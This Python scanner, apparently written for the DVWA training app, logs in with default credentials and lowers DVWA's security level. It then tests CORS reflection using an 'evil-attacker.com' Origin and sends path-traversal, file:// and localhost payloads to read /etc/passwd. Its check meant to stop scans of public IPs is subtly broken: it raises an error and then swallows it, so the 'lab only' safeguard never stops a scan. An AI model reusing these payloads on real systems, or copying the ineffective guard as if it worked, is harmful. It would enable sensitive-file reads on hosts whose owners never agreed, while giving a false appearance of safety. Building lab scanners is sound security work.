import requests
import logging
import ipaddress
import urllib.parse
import json 
import re
import socket
from datetime import datetime

# --- TELEMETRY SETUP ---
logger = logging.getLogger("CORS_SSRF")

class MisconfigScanner:
    def __init__(self, target_input):
        # 1. CLEAN INPUT & SETUP PATHS
        if "://" in target_input:
            self.target_ip = target_input.split("://")[1].split("/")[0]
        else:
            self.target_ip = target_input

        self.base_url = f"http://{self.target_ip}/dvwa"
        self.login_url = f"{self.base_url}/login.php"
        self.security_url = f"{self.base_url}/security.php"
        # DVWA "File Inclusion" is the standard test bed for SSRF/LFI
        self.vuln_url = f"{self.base_url}/vulnerabilities/fi/" 
        
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                          'AppleWebKit/537.36 (KHTML, like Gecko) '
                          'Chrome/91.0.4472.124 Safari/537.36'
        })
        self.logged_in = False
        
        self.verify_lab_environment()

    def _log_event(self, event_type, details, severity="INFO"):
        log_payload = {
            "timestamp": datetime.utcnow().isoformat(),
            "module": "[web] MisconfigScanner",
            "event_type": event_type,
            "target": self.target_ip,
            "severity": severity,
            "details": details
        }
        msg = json.dumps(log_payload)
        if severity == "WARNING": logger.warning(msg)
        elif severity == "CRITICAL": logger.critical(msg)
        else: logger.info(msg)

    def verify_lab_environment(self):
        try:
            try: ip_addr = socket.gethostbyname(self.target_ip)
            except: ip_addr = self.target_ip

            ip_obj = ipaddress.ip_address(ip_addr)
            if not ip_obj.is_private and not ip_obj.is_loopback:
                msg = f"SAFETY VIOLATION: {self.target_ip} is PUBLIC. Aborting."
                self._log_event("SAFETY_VIOLATION", {"ip": self.target_ip}, severity="CRITICAL")
                raise ValueError(msg)
        except ValueError:
            pass

    def _get_csrf_token(self, html):
        match = re.search(r"name=['\"]user_token['\"].*?value=['\"]([a-f0-9]+)['\"]", html, re.DOTALL)
        if match: return match.group(1)
        match = re.search(r"value=['\"]([a-f0-9]+)['\"].*?name=['\"]user_token['\"]", html, re.DOTALL)
        if match: return match.group(1)
        return None

    def login(self, username="admin", password="password"):
        print(f"[*] Authenticating to {self.login_url}...")
        try:
            resp = self.session.get(self.login_url, timeout=10)
            token = self._get_csrf_token(resp.text)
            
            data = {'username': username, 'password': password, 'Login': 'Login'}
            if token: data['user_token'] = token

            resp = self.session.post(self.login_url, data=data, allow_redirects=True)
            
            if "Welcome" in resp.text or "admin" in resp.text or "Logout" in resp.text:
                self.logged_in = True
                
                # Set Security Level to Low
                sec_resp = self.session.get(self.security_url)
                sec_token = self._get_csrf_token(sec_resp.text)
                sec_data = {'security': 'low', 'seclev_submit': 'Submit'}
                if sec_token: sec_data['user_token'] = sec_token
                
                self.session.post(self.security_url, data=sec_data)
                self.session.cookies.set('security', 'low', path='/', domain=self.target_ip)
                return True
            else:
                print("[-] Login failed.")
                return False
        except Exception as e:
            print(f"[!] Login Error: {e}")
            return False

    def test_cors(self):
        """Checks if the server reflects arbitrary Origin headers (CORS misconfiguration)."""
        if not self.logged_in:
            if not self.login(): return "Login Failed"

        print("[*] Testing for Insecure CORS Configuration...")
        
        origin_payload = "http://evil-attacker.com"
        headers = {'Origin': origin_payload}
        
        try:
            # We test against the logged-in dashboard/index
            test_url = f"{self.base_url}/index.php"
            resp = self.session.get(test_url, headers=headers, timeout=5)
            
            acao = resp.headers.get('Access-Control-Allow-Origin')
            acac = resp.headers.get('Access-Control-Allow-Credentials')
            
            if acao == origin_payload and acac == 'true':
                msg = "CRITICAL: Insecure CORS detected (Arbitrary Origin + Credentials)."
                print(f"[!] {msg}")
                self._log_event("CORS_MISCONFIG", {"status": "Vulnerable"}, severity="WARNING")
                return "CORS Vuln: Reflected Origin + Creds"
            
            elif acao == "*":
                print("[!] Wildcard CORS detected (Low Risk).")
                self._log_event("CORS_WILDCARD", {"status": "Low Risk"}, severity="INFO")
                return None
            else:
                print("[-] CORS configuration appears secure (No reflection).")
                
        except Exception as e:
            print(f"[!] CORS Check Error: {e}")
        
        return None

    def test_ssrf(self):
        """Attempts local file inclusion and internal service access via SSRF."""
        if not self.logged_in:
            if not self.login(): return "Login Failed"

        print(f"[*] Testing for SSRF/LFI on {self.vuln_url} ...")
        
        # In DVWA, 'page' is the vulnerable parameter
        # We test for Local File Inclusion (LFI) which is a subset of SSRF in this context
        # and satisfies the 'Data Exfiltration' requirement (reading /etc/passwd)
        payloads = [
            "../../../../../../etc/passwd",
            "file:///etc/passwd",
            "http://127.0.0.1/dvwa/phpinfo.php" # Requires allow_url_include=On
        ]
        
        for p in payloads:
            try:
                # DVWA uses GET for this vuln
                params = {'page': p}
                resp = self.session.get(self.vuln_url, params=params, timeout=5)
                
                if "root:x:0:0" in resp.text:
                    snippet = "root:x:0:0"
                    msg = f"SSRF/LFI CONFIRMED: Successfully read /etc/passwd"
                    print(f"[+] {msg}")
                    print(f"    -> Payload used: {p}")
                    
                    self._log_event("SSRF_DETECTED", {
                        "payload": p,
                        "status": "Vulnerable",
                        "impact": "Data Exfiltration (Sensitive File Read)"
                    }, severity="CRITICAL")
                    
                    return f"SSRF/LFI Success (Read /etc/passwd)"
                
                elif "PHP Version" in resp.text and "127.0.0.1" in p:
                     print(f"[+] SSRF CONFIRMED: Internal service reached (phpinfo).")
                     return "SSRF Success (Internal Scan)"

            except Exception as e:
                pass
                
        print("[-] No SSRF/LFI vulnerability detected (check Security Level).")
        return None